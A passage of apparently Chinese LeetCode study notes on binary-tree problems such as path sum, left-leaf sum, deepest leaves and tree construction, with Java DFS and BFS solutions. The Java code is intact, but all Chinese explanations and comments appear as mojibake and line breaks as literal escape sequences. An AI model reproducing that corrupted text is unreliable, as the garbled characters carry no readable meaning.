‡å’Œçš„æ ¹èŠ‚ç‚¹åˆ°å¶èŠ‚ç‚¹è·¯å¾„å¦‚ä¸Šå›¾æ‰€ç¤ºã€‚\n```\n\n**ç¤ºä¾‹ 2ï¼š**\n\n![](https://assets.leetcode.com/uploads/2021/01/18/pathsum2.jpg)\n\n```properties\nè¾“å…¥ï¼šroot = [1,2,3], targetSum = 5\nè¾“å‡ºï¼šfalse\nè§£é‡Šï¼šæ ‘ä¸­å­˜åœ¨ä¸¤æ¡æ ¹èŠ‚ç‚¹åˆ°å¶å­èŠ‚ç‚¹çš„è·¯å¾„ï¼š\n(1 --> 2): å’Œä¸º 3\n(1 --> 3): å’Œä¸º 4\nä¸å­˜åœ¨ sum = 5 çš„æ ¹èŠ‚ç‚¹åˆ°å¶å­èŠ‚ç‚¹çš„è·¯å¾„ã€‚\n```\n\n**ç¤ºä¾‹ 3ï¼š**\n\n```properties\nè¾“å…¥ï¼šroot = [], targetSum = 0\nè¾“å‡ºï¼šfalse\nè§£é‡Šï¼šç”±äºæ ‘æ˜¯ç©ºçš„ï¼Œæ‰€ä»¥ä¸å­˜åœ¨æ ¹èŠ‚ç‚¹åˆ°å¶å­èŠ‚ç‚¹çš„è·¯å¾„ã€‚\n```\n\n##### 1.æ·±åº¦ä¼˜å…ˆ\n\n```java\n// æ—¶é—´å¤æ‚åº¦ï¼šO(n)\n// ç©ºé—´å¤æ‚åº¦ï¼šO(h)\nclass Solution {\n    public boolean hasPathSum(TreeNode root, int sum) {\n        if (root == null) {\n            return false;\n        }\n        if (root.left == null && root.right == null) {\n            return sum == root.val;\n        }\n        return hasPathSum(root.left, sum - root.val) || hasPathSum(root.right, sum - root.val);\n    }\n}\n\n//éå†æ‰€æœ‰è·¯å¾„ï¼Œå¹¶ä¿å­˜æ‰€æœ‰è·¯å¾„å’Œ\nclass Solution {\n    public boolean hasPathSum(TreeNode root, int targetSum) {\n        List<Integer> res = new ArrayList<>();\n        dfs(root, 0, res);\n        for(int i : res){\n            if(i == targetSum){\n                return true;\n            }  \n        }\n        return false;\n    }\n\n    private void dfs(TreeNode root, int sum, List<Integer> res) {\n         if (root == null) return;\n         //å¦‚æœæ˜¯å¶å­èŠ‚ç‚¹ï¼Œè¯´æ˜æ‰¾åˆ°äº†ä¸€æ¡è·¯å¾„ï¼ŒæŠŠå®ƒåŠ å…¥åˆ°resä¸­\n         if (root.left == null && root.right == null) {\n             res.add(sum + root.val);\n             return;\n         }\n         //å¦‚æœä¸æ˜¯å¶å­èŠ‚ç‚¹ï¼Œåœ¨åˆ†åˆ«éå†ä»–çš„å·¦å³å­èŠ‚ç‚¹\n         dfs(root.left, sum + root.val , res);\n         dfs(root.right, sum + root.val , res);\n    }\n}\n\n\nclass Solution {\n    List<Integer> res = new ArrayList<>();\n    boolean flag = false;\n    public boolean hasPathSum(TreeNode root, int targetSum) {\n        dfs(root, targetSum);\n        return flag;\n    }\n\n    private void dfs(TreeNode root, int targetSum) {\n         if (root == null) {\n             return;\n         }\n         //è¯´æ˜æ‰¾åˆ°äº†ä¸€æ¡å’Œä¸ºtargetSumçš„è·¯å¾„\n         if (root.left == null && root.right == null) {\n             if(targetSum == root.val){\n                flag = true;\n             }\n         }\n         //å¦‚æœä¸æ˜¯å¶å­èŠ‚ç‚¹ï¼Œåœ¨åˆ†åˆ«éå†ä»–çš„å·¦å³å­èŠ‚ç‚¹\n         dfs(root.left, targetSum - root.val);\n         dfs(root.right, targetSum - root.val);\n    }\n}\n```\n\n##### 2.å¹¿åº¦ä¼˜å…ˆ\n\n```java\n// æ—¶é—´å¤æ‚åº¦ï¼šO(n)\n// ç©ºé—´å¤æ‚åº¦ï¼šO(n)\n// ä½¿ç”¨ä¸€ä¸ªé˜Ÿåˆ—\nclass Solution {\n    public boolean hasPathSum(TreeNode root, int targetSum) {\n        List<Integer> res = new ArrayList<>();\n        if (root == null) return false;\n        Queue<Object> queue = new LinkedList<>();\n        queue.offer(root);\n        queue.offer(root.val);\n        while (!queue.isEmpty()) {\n            TreeNode node = (TreeNode) queue.poll();\n            int path = (int) queue.poll();\n            //å¦‚æœåˆ°å¶å­èŠ‚ç‚¹ï¼Œè¯´æ˜æ‰¾åˆ°äº†ä¸€æ¡å®Œæ•´è·¯å¾„\n            if (node.left == null && node.right == null) {\n                res.add(path);\n              \n            }\n\n            //å³å­èŠ‚ç‚¹ä¸ä¸ºç©ºå°±æŠŠå³å­èŠ‚ç‚¹å’Œè·¯å¾„å­˜æ”¾åˆ°é˜Ÿåˆ—ä¸­\n            if (node.right != null) {\n                queue.offer(node.right);\n                queue.offer(path + node.right.val);\n            }\n\n            //å·¦å­èŠ‚ç‚¹ä¸ä¸ºç©ºå°±æŠŠå·¦å­èŠ‚ç‚¹å’Œè·¯å¾„å­˜æ”¾åˆ°é˜Ÿåˆ—ä¸­\n            if (node.left != null) {\n                queue.offer(node.left);\n                queue.offer(path + node.left.val);\n            }\n        }\n        for(int i : res){\n            if(i == targetSum){\n                return true;\n            }  \n        }\n        return false;\n    }\n}\n\n// ä½¿ç”¨ä¸¤ä¸ªé˜Ÿåˆ—\nclass Solution {\n    public boolean hasPathSum(TreeNode root, int sum) {\n        if (root == null) {\n            return false;\n        }\n        Queue<TreeNode> queNode = new LinkedList<TreeNode>();\n        Queue<Integer> queVal = new LinkedList<Integer>();\n        queNode.offer(root);\n        queVal.offer(root.val);\n        while (!queNode.isEmpty()) {\n            TreeNode now = queNode.poll();\n            int temp = queVal.poll();\n            if (now.left == null && now.right == null) {\n                if (temp == sum) {\n                    return true;\n                }\n                continue;\n            }\n            if (now.left != null) {\n                queNode.offer(now.left);\n                queVal.offer(now.left.val + temp);\n            }\n            if (now.right != null) {\n                queNode.offer(now.right);\n                queVal.offer(now.right.val + temp);\n            }\n        }\n        return false;\n    }\n}\n```\n\n#### [113. è·¯å¾„æ€»å’Œ II](https://leetcode.cn/problems/path-sum-ii/description/)\n\nç»™ä½ äºŒå‰æ ‘çš„æ ¹èŠ‚ç‚¹ `root` å’Œä¸€ä¸ªæ•´æ•°ç›®æ ‡å’Œ `targetSum` ï¼Œæ‰¾å‡ºæ‰€æœ‰ **ä»æ ¹èŠ‚ç‚¹åˆ°å¶å­èŠ‚ç‚¹** è·¯å¾„æ€»å’Œç­‰äºç»™å®šç›®æ ‡å’Œçš„è·¯å¾„ã€‚\n\n**ç¤ºä¾‹ 1ï¼š**\n\n![](https://assets.leetcode.com/uploads/2021/01/18/pathsumii1.jpg)\n\n```properties\nè¾“å…¥ï¼šroot = [5,4,8,11,null,13,4,7,2,null,null,5,1], targetSum = 22\nè¾“å‡ºï¼š[[5,4,11,2],[5,8,4,5]]\n```\n\n**ç¤ºä¾‹ 2ï¼š**\n\n![img](../images/æ•°æ®ç»“æ„ä¸ç®—æ³•/pathsum2-20221130142022285.jpg)\n\n```properties\nè¾“å…¥ï¼šroot = [1,2,3], targetSum = 5\nè¾“å‡ºï¼š[]\n```\n\n**ç¤ºä¾‹ 3ï¼š**\n\n```properties\nè¾“å…¥ï¼šroot = [1,2], targetSum = 0\nè¾“å‡ºï¼š[]\n```\n\n------\n\n##### 1.æ·±åº¦ä¼˜å…ˆ\n\n```java\n// æ—¶é—´å¤æ‚åº¦ï¼šO(n^2)\n// ç©ºé—´å¤æ‚åº¦ï¼šO(n)\nclass Solution {\n    List<List<Integer>> res = new ArrayList<>();\n    List<Integer> path = new ArrayList<>();\n    public List<List<Integer>> pathSum(TreeNode root, int targetSum) {\n        dfs(root, targetSum);\n        return res;\n\n    }\n    void dfs(TreeNode root, int targetSum){\n        if (root == null) {\n            return;\n        }\n        path.add(root.val);\n        //å¦‚æœæ˜¯å¶å­èŠ‚ç‚¹ï¼Œä¸”è·¯å¾„å’Œç­‰äºtargetSumåˆ™æ·»åŠ åˆ°res\n        if (root.left == null && root.right == null) {\n            if(targetSum == root.val){\n                res.add(new ArrayList(path));\n                //å› ä¸ºresé‡Œé¢é‚£ä¸ªpathå’Œä½ åç»­ä¿®æ”¹çš„é‚£ä¸ªpathæŒ‡å‘çš„æ˜¯åŒä¸€å—å†…å­˜åŒºåŸŸï¼Œ\n            \t\t//æ‰€ä»¥ä½ å¯¹pathè¿›è¡Œä¿®æ”¹ï¼Œä¹Ÿä¼šæŠŠresé‡Œçš„ç»“æœç»™ä¿®æ”¹æ‰\n            }\n        }\n        dfs(root.left, targetSum - root.val);\n        dfs(root.right, targetSum - root.val);\n        path.remove(path.size() - 1); //åˆ é™¤è¯¥é›†åˆæœ€åä¸€ä¸ªå…ƒç´ ,å®ç°pathçš„å¤ç”¨\n    }\n}\n```\n\n##### 2.å¹¿åº¦ä¼˜å…ˆ\n\n```java\n// æ—¶é—´å¤æ‚åº¦ï¼šO(n^2)\n// ç©ºé—´å¤æ‚åº¦ï¼šO(n)\nclass Solution {\n    public List<List<Integer>> pathSum(TreeNode root, int targetSum) {\n        List<List<Integer>> res = new ArrayList<>();\n        if(root == null){\n            return res;\n        }\n        //ä½¿ç”¨ä¸¤ä¸ªé˜Ÿåˆ—ï¼Œä¸€ä¸ªå­˜å‚¨ç»“ç‚¹ï¼Œä¸€ä¸ªå­˜å‚¨ä»æ ¹ç»“ç‚¹åˆ°å½“å‰èŠ‚ç‚¹çš„è·¯å¾„\n        Queue<TreeNode> nodeQueue = new LinkedList<>();\n        Queue<List<Integer>>  pathQueue = new LinkedList<>();\n        //æ ¹èŠ‚ç‚¹å…¥é˜Ÿ\n        nodeQueue.offer(root);\n        //æ ¹èŠ‚ç‚¹çš„è·¯å¾„å…¥é˜Ÿ\n        List<Integer> pathList = new ArrayList<>();\n        pathList.add(root.val);\n        pathQueue.offer(pathList);\n\n        while(!nodeQueue.isEmpty()){\n            //å½“å‰èŠ‚ç‚¹å‡ºé˜Ÿ\n            TreeNode node = nodeQueue.poll();\n            //å½“å‰èŠ‚ç‚¹çš„è·¯å¾„å‡ºé˜Ÿ\n            List<Integer> tempList = pathQueue.poll();\n            \n             //å¦‚æœæ»¡è¶³æ¡ä»¶ï¼Œå°±æŠŠè·¯å¾„å­˜å‚¨åˆ°resä¸­\n            if(node.left == null && node.right == null){\n               \n                int pathSum = 0;\n                for(int i : tempList){\n                    pathSum += i;\n                }\n\n                if(pathSum == targetSum){\n                    res.add(tempList);\n                }\n            }\n             //å·¦å­èŠ‚ç‚¹ä¸ä¸ºç©ºï¼Œå·¦å­èŠ‚ç‚¹å’Œè·¯å¾„å…¥é˜Ÿ\n            if(node.left != null){\n                nodeQueue.offer(node.left);\n                tempList.add(node.left.val);\n                pathQueue.offer(new ArrayList<>(tempList));\n                tempList.remove(tempList.size() - 1);//ï¼Ÿï¼Ÿï¼Ÿ\n\n            }\n            if(node.right != null){\n                nodeQueue.offer(node.right);\n                tempList.add(node.right.val);\n                pathQueue.offer(new ArrayList<>(tempList));\n            }\n        }\n        return res;\n    }\n}\n```\n\n\n\n#### [437. è·¯å¾„æ€»å’Œ III](https://leetcode.cn/problems/path-sum-iii/description/)\n\n\n\n#### [é¢è¯•é¢˜ 04.12. æ±‚å’Œè·¯å¾„ ](https://leetcode.cn/problems/paths-with-sum-lcci/)\n\n#### [988. å¶ç»“ç‚¹å¼€å§‹çš„æœ€å°å­—ç¬¦ä¸²](https://leetcode.cn/problems/smallest-string-starting-from-leaf/)\n\n#### [129. æ ¹èŠ‚ç‚¹åˆ°å¶èŠ‚ç‚¹æ•°å­—ä¹‹å’Œ](https://leetcode.cn/problems/sum-root-to-leaf-numbers/description/)\n\n#### [124. äºŒå‰æ ‘ä¸­çš„æœ€å¤§è·¯å¾„å’Œ](https://leetcode.cn/problems/binary-tree-maximum-path-sum/)\n\n#### [687. æœ€é•¿åŒå€¼è·¯å¾„](https://leetcode.cn/problems/longest-univalue-path/)\n\n#### [543. äºŒå‰æ ‘çš„ç›´å¾„](https://leetcode.cn/problems/diameter-of-binary-tree/)\n\n\n\n\n\n\n\n### âºäºŒå‰æ ‘èŠ‚ç‚¹\n\n#### [404. å·¦å¶å­ä¹‹å’Œ](https://leetcode.cn/problems/sum-of-left-leaves/)\n\nç»™å®šäºŒå‰æ ‘çš„æ ¹èŠ‚ç‚¹ `root` ï¼Œè¿”å›æ‰€æœ‰å·¦å¶å­ä¹‹å’Œã€‚ \n\n**ç¤ºä¾‹ 1ï¼š**\n\n![](https://assets.leetcode.com/uploads/2021/04/08/leftsum-tree.jpg)\n\n```properties\nè¾“å…¥: root = [3,9,20,null,null,15,7] \nè¾“å‡º: 24 \nè§£é‡Š: åœ¨è¿™ä¸ªäºŒå‰æ ‘ä¸­ï¼Œæœ‰ä¸¤ä¸ªå·¦å¶å­ï¼Œåˆ†åˆ«æ˜¯ 9 å’Œ 15ï¼Œæ‰€ä»¥è¿”å› 24\n```\n\n**ç¤ºä¾‹ 2:**\n\n```properties\nè¾“å…¥: root = [1]\nè¾“å‡º: 0\n```\n\n##### 1.æ·±åº¦ä¼˜å…ˆ\n\n```java\nclass Solution {\n    public int sumOfLeftLeaves(TreeNode root) {\n        dfs(root);\n        return sum;\n    }\n    int sum = 0;\n    void dfs(TreeNode root){\n        if(root == null){\n            return;\n        }\n        if (root.left != null && root.left.left == null && root.left.right == null) {\n            // æ‰¾åˆ°å·¦ä¾§çš„å¶å­èŠ‚ç‚¹ï¼Œè®°å½•ç´¯åŠ å€¼\n            sum += root.left.val;\n        }\n        dfs(root.left);\n        dfs(root.right);\n\n    }\n}\n```\n\n##### 2.å¹¿åº¦ä¼˜å…ˆ\n\n```java\n// æ—¶é—´å¤æ‚åº¦ï¼šO(n)\n// ç©ºé—´å¤æ‚åº¦ï¼šO(n)\nclass Solution {\n    public int sumOfLeftLeaves(TreeNode root) {\n        if(root == null){\n            return 0;\n        }\n        Queue<TreeNode> queue = new LinkedList<>();\n        queue.offer(root);\n        int sum = 0;\n        while(!queue.isEmpty()){\n            int n = queue.size();\n            for(int i = 0; i < n; i++){\n                TreeNode node = queue.poll();\n                if(node.left != null) {\n                    //åˆ¤æ–­å¶å­èŠ‚ç‚¹\n                    if (node.left.left == null && node.left.right == null) {\n                        sum += node.left.val;\n                    } else {\n                        queue.offer(node.left);\n                    }\n                    \n                }\n                if(node.right != null) queue.offer(node.right);\n            }\n        }\n        return sum;\n    }\n}\n\n//ä¸åˆ†å±‚\nclass Solution {\n    public int sumOfLeftLeaves(TreeNode root) {\n        if(root == null){\n            return 0;\n        }\n        Queue<TreeNode> queue = new LinkedList<>();\n        queue.offer(root);\n        int sum = 0;\n        while(!queue.isEmpty()){\n            TreeNode node = queue.poll();\n            if(node.left != null) {\n                //åˆ¤æ–­å¶å­èŠ‚ç‚¹\n                if (node.left.left == null && node.left.right == null) {\n                    sum += node.left.val;\n                } else {\n                    queue.offer(node.left);\n                }\n            }\n            if(node.right != null) queue.offer(node.right);\n        }\n        return sum;\n    }\n}\n```\n\n#### [513. æ‰¾æ ‘å·¦ä¸‹è§’çš„å€¼](https://leetcode.cn/problems/find-bottom-left-tree-value/)\n\n> æ­¤é¢˜åŒï¼š[å‰‘æŒ‡ Offer II 045. äºŒå‰æ ‘æœ€åº•å±‚æœ€å·¦è¾¹çš„å€¼ ](https://leetcode.cn/problems/LwUNpT/description/)\n\nç»™å®šä¸€ä¸ªäºŒå‰æ ‘çš„ **æ ¹èŠ‚ç‚¹** `root`ï¼Œè¯·æ‰¾å‡ºè¯¥äºŒå‰æ ‘çš„ **æœ€åº•å±‚ æœ€å·¦è¾¹** èŠ‚ç‚¹çš„å€¼ã€‚\n\nå‡è®¾äºŒå‰æ ‘ä¸­è‡³å°‘æœ‰ä¸€ä¸ªèŠ‚ç‚¹ã€‚ \n\n**ç¤ºä¾‹ 1:**\n\n![](https://assets.leetcode.com/uploads/2020/12/14/tree1.jpg)\n\n```properties\nè¾“å…¥: root = [2,1,3]\nè¾“å‡º: 1\n```\n\n**ç¤ºä¾‹ 2:**\n\n![](https://assets.leetcode.com/uploads/2020/12/14/tree2.jpg)\n\n```properties\nè¾“å…¥: [1,2,3,4,null,5,6,null,null,7]\nè¾“å‡º: 7\n```\n\n------\n\n##### 1.å¹¿åº¦ä¼˜å…ˆ\n\n```java\n// æ—¶é—´å¤æ‚åº¦ï¼šO(n)\n// ç©ºé—´å¤æ‚åº¦ï¼šO(n)\nclass Solution {\n    public int findBottomLeftValue(TreeNode root) {\n        if(root == null){\n            return 0;\n        }\n        Queue<TreeNode> queue = new LinkedList<>();\n        queue.offer(root);\n        int res = 0;\n        while(!queue.isEmpty()){\n            int n = queue.size();\n            for(int i = 0; i < n; i++){\n                TreeNode node = queue.poll();\n                if(i == 0){\n                    res = node.val;\n                }\n                if(node.left != null) queue.offer(node.left);\n                if(node.right != null) queue.offer(node.right);\n            }\n        }\n        return res;\n\n    }\n}\n\n//å±‚åºéå†ï¼Œä»å³å¾€å·¦æ·»åŠ ç»“ç‚¹ï¼Œæœ€åè®¿é—®çš„ä¸€ä¸ªç»“ç‚¹å³ä¸ºæœ€åä¸€å±‚æœ€å·¦è¾¹çš„ã€‚\nclass Solution {\n    public int findBottomLeftValue(TreeNode root) {\n        int res = 0;\n        Queue<TreeNode> queue = new ArrayDeque<TreeNode>();\n        queue.offer(root);\n        while (!queue.isEmpty()) {\n            TreeNode node = queue.poll();\n            if (node.right != null) queue.offer(node.right);\n            if (node.left != null) queue.offer(node.left);\n            res = node.val; //æœ€åè®¿é—®çš„ä¸€ä¸ªç»“ç‚¹å³ä¸ºæœ€åä¸€å±‚æœ€å·¦è¾¹çš„ã€‚\n        }\n        return res;\n    }\n}\n```\n\n##### 2.æ·±åº¦ä¼˜å…ˆ\n\n```java\n// æ—¶é—´å¤æ‚åº¦ï¼šO(n)\n// ç©ºé—´å¤æ‚åº¦ï¼šO(n)\nclass Solution {\n\n    // è®°å½•äºŒå‰æ ‘çš„æœ€å¤§æ·±åº¦\n    int maxDepth = 0;\n    // è¿”å›ç»“æœ\n    int res = 0;\n\n    public int findBottomLeftValue(TreeNode root) {\n        dfs(root, 1);\n        return res;\n    }\n    // depth è®°å½• dfs é€’å½’éå†åˆ°çš„æ·±åº¦\n    void dfs(TreeNode root, int depth){\n        if(root == null){\n            return;\n        }\n        if (depth > maxDepth) {\n            // åˆ°æœ€å¤§æ·±åº¦æ—¶ç¬¬ä¸€æ¬¡é‡åˆ°çš„èŠ‚ç‚¹å°±æ˜¯å·¦ä¸‹è§’çš„èŠ‚ç‚¹\n            maxDepth = depth;\n            res = root.val;\n        }\n        dfs(root.left, depth + 1);\n        dfs(root.right, depth + 1);\n    }\n}\n```\n\n#### [1302. å±‚æ•°æœ€æ·±å¶å­èŠ‚ç‚¹çš„å’Œ](https://leetcode.cn/problems/deepest-leaves-sum/description/)\n\nç»™ä½ ä¸€æ£µäºŒå‰æ ‘çš„æ ¹èŠ‚ç‚¹ `root` ï¼Œè¯·ä½ è¿”å› **å±‚æ•°æœ€æ·±çš„å¶å­èŠ‚ç‚¹çš„å’Œ** ã€‚\n\n**ç¤ºä¾‹ 1ï¼š**\n\n![](https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2019/12/28/1483_ex1.png)\n\n```properties\nè¾“å…¥ï¼šroot = [1,2,3,4,5,null,6,7,null,null,null,null,8]\nè¾“å‡ºï¼š15\n```\n\n**ç¤ºä¾‹ 2ï¼š**\n\n```properties\nè¾“å…¥ï¼šroot = [6,7,8,2,7,1,3,9,null,1,4,null,null,null,5]\nè¾“å‡ºï¼š19\n```\n\n##### 1.å¹¿åº¦ä¼˜å…ˆ\n\n```java\n// æ—¶é—´å¤æ‚åº¦ï¼šO(n)\n// ç©ºé—´å¤æ‚åº¦ï¼šO(n)\nclass Solution {\n    public int deepestLeavesSum(TreeNode root) {\n        if(root == null) return 0;\n        Queue<TreeNode> queue = new LinkedList<>();\n        queue.offer(root);\n        int sum = 0;\n        while(!queue.isEmpty()){\n            int n = queue.size();\n            sum = 0;\n            for(int i = 0; i < n; i++){\n                TreeNode node = queue.poll();\n                sum += node.val; // ç´¯åŠ ä¸€å±‚çš„èŠ‚ç‚¹ä¹‹å’Œ\n                if(node.left != null) queue.offer(node.left);\n                if(node.right != null) queue.offer(node.right);\n            }\n        }\n        return sum;\n    }\n}\n```\n\n##### 2.æ·±åº¦ä¼˜å…ˆ\n\n```java\n// æ—¶é—´å¤æ‚åº¦ï¼šO(n)\n// ç©ºé—´å¤æ‚åº¦ï¼šO(n)\nclass Solution {\n    int maxDepth = 0;\n    int sum = 0;\n    public int deepestLeavesSum(TreeNode root) {\n        dfs(root, 1);\n        return sum;\n    }\n\n    void dfs(TreeNode root, int depth){\n        if(root == null){\n            return;\n        }\n        if (depth > maxDepth) {\n            // åˆ°æœ€å¤§æ·±åº¦æ—¶ç¬¬ä¸€æ¬¡é‡åˆ°çš„èŠ‚ç‚¹å°±æ˜¯å·¦ä¸‹è§’çš„èŠ‚ç‚¹\n            maxDepth = depth;\n            sum = root.val;\n        } else if(depth == maxDepth) {\n            // ç´¯åŠ ä¹‹åçš„èŠ‚ç‚¹å€¼\n            sum += root.val;\n        }\n\n        dfs(root.left, depth + 1);\n        dfs(root.right, depth + 1);\n    }\n}\n```\n\n#### [222. å®Œå…¨äºŒå‰æ ‘çš„èŠ‚ç‚¹ä¸ªæ•° ](https://leetcode.cn/problems/count-complete-tree-nodes/)\n\nç»™ä½ ä¸€æ£µ **å®Œå…¨äºŒå‰æ ‘** çš„æ ¹èŠ‚ç‚¹ `root` ï¼Œæ±‚å‡ºè¯¥æ ‘çš„èŠ‚ç‚¹ä¸ªæ•°ã€‚\n\nå®Œå…¨äºŒå‰æ ‘çš„å®šä¹‰å¦‚ä¸‹ï¼šåœ¨å®Œå…¨äºŒå‰æ ‘ä¸­ï¼Œé™¤äº†æœ€åº•å±‚èŠ‚ç‚¹å¯èƒ½æ²¡å¡«æ»¡å¤–ï¼Œå…¶ä½™æ¯å±‚èŠ‚ç‚¹æ•°éƒ½è¾¾åˆ°æœ€å¤§å€¼ï¼Œå¹¶ä¸”æœ€ä¸‹é¢ä¸€å±‚çš„èŠ‚ç‚¹éƒ½é›†ä¸­åœ¨è¯¥å±‚æœ€å·¦è¾¹çš„è‹¥å¹²ä½ç½®ã€‚è‹¥æœ€åº•å±‚ä¸ºç¬¬ `h` å±‚ï¼Œåˆ™è¯¥å±‚åŒ…å« `1~2^h` ä¸ªèŠ‚ç‚¹ã€‚ \n\n**ç¤ºä¾‹ 1ï¼š**\n\n![](https://assets.leetcode.com/uploads/2021/01/14/complete.jpg)\n\n```properties\nè¾“å…¥ï¼šroot = [1,2,3,4,5,6]\nè¾“å‡ºï¼š6\n```\n\n**ç¤ºä¾‹ 2ï¼š**\n\n```properties\nè¾“å…¥ï¼šroot = []\nè¾“å‡ºï¼š0\n```\n\n**ç¤ºä¾‹ 3ï¼š**\n\n```properties\nè¾“å…¥ï¼šroot = [1]\nè¾“å‡ºï¼š1\n```\n\n------\n\n##### 1.é€’å½’\n\n```java\nclass Solution {\n    public int countNodes(TreeNode root) {\n        if(root == null){\n            return 0;\n        }\n        int countleft = countNodes(root.left);\n        int countright = countNodes(root.right);\n        return countleft + countright + 1;\n    }\n}\n\n//ä¼˜åŒ–\n// åˆ©ç”¨æ»¡äºŒå‰æ ‘çš„æ€§è´¨æ¥è¿›è¡Œæ±‚è§£\npublic int countNodes(TreeNode root) {\n    if(root == null) return 0;\n    // è¿”å›å·¦å³å­æ ‘çš„é«˜åº¦\n    int left = countLevel(root.left);\n    int right = countLevel(root.right);\n    if(left == right){\n        // è¯´æ˜å·¦ä¾§ä¸ºæ»¡äºŒå‰æ ‘ï¼Œ[1 << left == (int)Math.pow(2, left)]\n        return countNodes(root.right) + (1 << left);\n     } else{\n        // è¯´æ˜å³ä¾§ä¸ºæ»¡äºŒå‰æ ‘\n        return countNodes(root.left) + (1 << right);\n    }\n}\n// è®¡ç®—é«˜åº¦\nint countLevel(TreeNode root) {\n    int level = 0;\n    while(root != null){\n      root = root.left;\n      level++;\n    }\n    return level;\n}\n```\n\n##### 2.è¿­ä»£\n\n```java\nclass Solution {\n    public int countNodes(TreeNode root) {\n        if(root == null){\n            return 0;\n        }\n        int res = 0;\n        Queue<TreeNode> queue = new LinkedList<>();\n        queue.offer(root);\n        while(!queue.isEmpty()){\n            int n = queue.size();\n            res += n;\n            for(int i = 0; i < n; i++){\n                TreeNode node = queue.poll();\n                if(node.left != null) queue.offer(node.left);\n                if(node.right != null) queue.offer(node.right);\n            }\n        }\n        return res;\n    }\n}\n```\n\n### â»äºŒå‰æ ‘æ„å»º\n\n#### [106. ä»ä¸­åºä¸ååºéå†åºåˆ—æ„é€ äºŒå‰æ ‘](https://leetcode.cn/problems/construct-binary-tree-from-inorder-and-postorder-traversal/description/)\n\nç»™å®šä¸¤ä¸ªæ•´æ•°æ•°ç»„ `inorder` å’Œ `postorder` ï¼Œå…¶ä¸­ `inorder` æ˜¯äºŒå‰æ ‘çš„ä¸­åºéå†ï¼Œ `postorder` æ˜¯åŒä¸€æ£µæ ‘çš„ååºéå†ï¼Œè¯·ä½ æ„é€ å¹¶è¿”å›è¿™é¢— *äºŒå‰æ ‘* ã€‚\n\n**ç¤ºä¾‹ 1:**\n\n![](https://assets.leetcode.com/uploads/2021/02/19/tree.jpg)\n\n```properties\nè¾“å…¥ï¼šinorder = [9,3,15,20,7], postorder = [9,15,7,20,3]\nè¾“å‡ºï¼š[3,9,20,null,null,15,7]\n```\n\n**ç¤ºä¾‹ 2:**\n\n```properties\nè¾“å…¥ï¼šinorder = [-1], postorder = [-1]\nè¾“å‡ºï¼š[-1]\n```\n\n------\n\n**æ„é€ äºŒå‰æ ‘ï¼Œç¬¬ä¸€ä»¶äº‹ä¸€å®šæ˜¯æ‰¾æ ¹èŠ‚ç‚¹ï¼Œç„¶åæƒ³åŠæ³•æ„é€ å·¦å³å­æ ‘**ã€‚\n\n- ä¸­åºéå†çš„é¡ºåºï¼šå·¦å­©å­ï¼Œæ ¹èŠ‚ç‚¹ï¼Œå³å­©å­ã€‚\n- ååºéå†çš„é¡ºåºï¼šå·¦å­©å­ï¼Œå³å­©å­ï¼Œæ ¹èŠ‚ç‚¹ã€‚\n\n| ![](https://img.jwt1399.top/img/202212011118258.jpeg) | ![](https://img.jwt1399.top/img/202212011118987.jpeg) |\n| ----------------------------------------------------- | ----------------------------------------------------- |\n\nååºéå†ç»“æœæœ€åä¸€ä¸ªå°±æ˜¯æ ¹èŠ‚ç‚¹çš„å€¼ï¼Œç„¶åå†æ ¹æ®ä¸­åºéå†ç»“æœç¡®å®šå·¦å³å­æ ‘çš„èŠ‚ç‚¹ã€‚\n\n```java\nclass Solution {\n    // å­˜å‚¨ inorder ä¸­å€¼åˆ°ç´¢å¼•çš„æ˜ å°„\n    HashMap<Integer, Integer> valToIndex = new HashMap<>();\n\n    public TreeNode buildTree(int[] inorder, int[] postorder) {\n        for (int i = 0; i < inorder.length; i++) {\n            valToIndex.put(inorder[i], i);\n        }\n        return build(inorder, 0, inorder.length - 1, postorder, 0, postorder.length - 1);\n    }\n\n    /*\n       å®šä¹‰ï¼š\n       ä¸­åºéå†æ•°ç»„ä¸º inorder[inStart..inEnd]ï¼Œ\n       ååºéå†æ•°ç»„ä¸º postorder[postStart..postEnd]ï¼Œ\n       æ„é€ è¿™ä¸ªäºŒå‰æ ‘å¹¶è¿”å›è¯¥äºŒå‰æ ‘çš„æ ¹èŠ‚ç‚¹\n    */\n    TreeNode build(int[] inorder, int inStart, int inEnd,\n                int[] postorder, int postStart, int postEnd) {\n\n        //ç»ˆæ­¢æ¡ä»¶ï¼Œæ²¡æœ‰å…ƒç´ å¯æ„å»ºï¼Œè¿”å›ç©º\n        if (inStart > inEnd) { \n            return null;\n        }\n        // root èŠ‚ç‚¹å¯¹åº”çš„å€¼å°±æ˜¯ååºéå†æ•°ç»„çš„æœ€åä¸€ä¸ªå…ƒç´ \n        int rootVal = postorder[postEnd];\n        // rootVal åœ¨ä¸­åºéå†æ•°ç»„ä¸­çš„ç´¢å¼•\n        int index = valToIndex.get(rootVal);\n        // å·¦å­æ ‘çš„èŠ‚ç‚¹ä¸ªæ•°\n        int leftSize = index - inStart;\n        // æ„é€ ç»“ç‚¹\n        TreeNode root = new TreeNode(rootVal);\n\n        // é€’å½’æ„é€ å·¦å³å­æ ‘\n        root.left = build(inorder, inStart, index - 1,\n                         postorder, postStart, postStart + leftSize - 1);\n        \n        root.right = build(inorder, index + 1, inEnd,\n                          postorder, postStart + leftSize, postEnd - 1);\n        return root;\n    }\n}\n```\n\n#### [105. ä»å‰åºä¸ä¸­åºéå†åºåˆ—æ„é€ äºŒå‰æ ‘](https://leetcode.cn/problems/construct-binary-tree-from-preorder-and-inorder-traversal/)\n\n> æœ¬é¢˜ä¸[å‰‘æŒ‡ Offer 07. é‡å»ºäºŒå‰æ ‘ ](https://leetcode.cn/problems/zhong-jian-er-cha-shu-lcof/)ç›¸åŒ\n\nç»™å®šä¸¤ä¸ªæ•´æ•°æ•°ç»„ `preorder` å’Œ `inorder` ï¼Œå…¶ä¸­ `preorder` æ˜¯äºŒå‰æ ‘çš„**å…ˆåºéå†**ï¼Œ `inorder` æ˜¯åŒä¸€æ£µæ ‘çš„**ä¸­åºéå†**ï¼Œè¯·æ„é€ äºŒå‰æ ‘å¹¶è¿”å›å…¶æ ¹èŠ‚ç‚¹ã€‚\n\n**ç¤ºä¾‹ 1:**\n\n![](https://assets.leetcode.com/uploads/2021/02/19/tree.jpg)\n\n```properties\nè¾“å…¥: preorder = [3,9,20,15,7], inorder = [9,3,15,20,7]\nè¾“å‡º: [3,9,20,null,null,15,7]\n```\n\n**ç¤ºä¾‹ 2:**\n\n```properties\nè¾“å…¥: preorder = [-1], inorder = [-1]\nè¾“å‡º: 